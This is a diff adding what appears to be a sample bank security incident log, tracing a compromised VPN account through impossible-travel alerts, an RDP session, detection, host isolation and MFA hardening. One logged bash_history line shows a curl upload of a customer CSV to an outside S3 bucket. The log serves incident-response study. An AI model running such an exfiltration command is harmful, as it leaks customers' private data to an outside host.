@@ -1,0 +1,83 @@
+──────────────────────────────────────────────────────────────
+Bank of Ontario – Security Incident Logs (EXCERPT)
+Date: 2025-05-23
+Incident ID: BOO-SEC-2025-0587
+──────────────────────────────────────────────────────────────
+
+[03:26:12] vpn-gw2.bankontario.net:
+INFO: Successful VPN login: user=r.thompson@bankontario.net
+      IP=185.220.101.57  GeoLocation=Warsaw, Poland
+      MFA_Method=Legacy-OTP-Token
+
+[03:27:58] vpn-gw2.bankontario.net:
+INFO: Successful VPN login: user=r.thompson@bankontario.net
+      IP=72.137.119.204  GeoLocation=Toronto, Canada
+      MFA_Method=Legacy-OTP-Token
+
+[03:28:41] cisco-securex:
+ALERT: Impossible travel detected for user r.thompson
+       Location #1: Warsaw, PL (185.220.101.57)
+       Location #2: Toronto, CA (72.137.119.204)
+       Action: Raised Severity to CRITICAL, started auto-enrichment
+
+[03:30:04] cisco-securex:
+Enriched indicators with known TOR exit node: 185.220.101.57
+Asset Risk: ELEVATED – user matches dark web breach record (2023 LinkedIn)
+
+[03:45:10] cb-engineering-logs:
+SESSION_LOG: New RDP login: user=r.thompson → host=INT-ENG-BETA04
+              Process chain observed: powershell → curl → bash
+
+[04:01:22] /home/rthomp/.bash_history (INT-ENG-BETA04):
+curl https://s3.eu-west-1.amazonaws.com/bk-dump/boo.tar.gz -T /mnt/tmp/customer_staging.csv
+
+[04:04:10] cisco-umbrella:
+ALERT: Outbound HTTP PUT request to unregistered AWS S3 bucket
+       Domain: s3.eu-west-1.amazonaws.com
+       Action: ALLOWED (no policy match)
+
+[04:07:29] secure-endpoint.bankontario.net:
+DETECTION: SHA256=b0ff6f2c… matched known indicator: Data Exfiltration Tool
+       Host: INT-ENG-BETA04
+       Severity: HIGH
+       Quarantine: PENDING
+
+[04:15:00] ansible-runner (Triggered via SecureX):
+TASK [Isolate endpoint INT-ENG-BETA04] ✔️ SUCCESS
+TASK [Notify SOC Team on Teams + Email] ✔️ SUCCESS
+
+[04:18:44] ldap-auth-log:
+ACTION: VPN access revoked for user r.thompson
+ACTION: Account disabled in Active Directory OU=Engineering
+
+[04:25:10] cisco-amp-console:
+ACTION: Host quarantined → INT-ENG-BETA04
+Comment: "SecureX incident correlation triggered isolate_host()"
+
+[04:45:10] service-now:
+IR TICKET BOO-SEC-2025-0587 updated: Status → CONTAINED
+
+[06:00:00] deloitte-cyber:
+Live memory dump completed on INT-ENG-BETA04
+IOC Matches: 3 confirmed, 1 suspected exfil tool
+
+[08:15:00] ansible-playbook:
+TASK [Disable legacy OTP fallback MFA across all users] ✔️
+TASK [Update Duo Policy Enforcement Rules] ✔️
+TASK [Add TOR IPs to FTD Blocklist] ✔️
+TASK [Purge stale user sessions from /var/cache/openvpn] ✔️
+
+[11:45:00] vpn-gw2.bankontario.net:
+INFO: Legacy MFA fallback officially disabled
+INFO: Total 117 users moved to biometric-only policy
+
+[17:00:00] cisco-securex:
+CLOSE_EVENT: No further outbound activity from affected endpoints
+Status: Threat actor access revoked, system hardened
+
+[20:00:00] incident-log:
+BOO-SEC-2025-0587 marked RESOLVED by IR Lead Ravi Khurana
+
+──────────────────────────────────────────────────────────────
+END OF LOG FILE
+──────────────────────────────────────────────────────────────
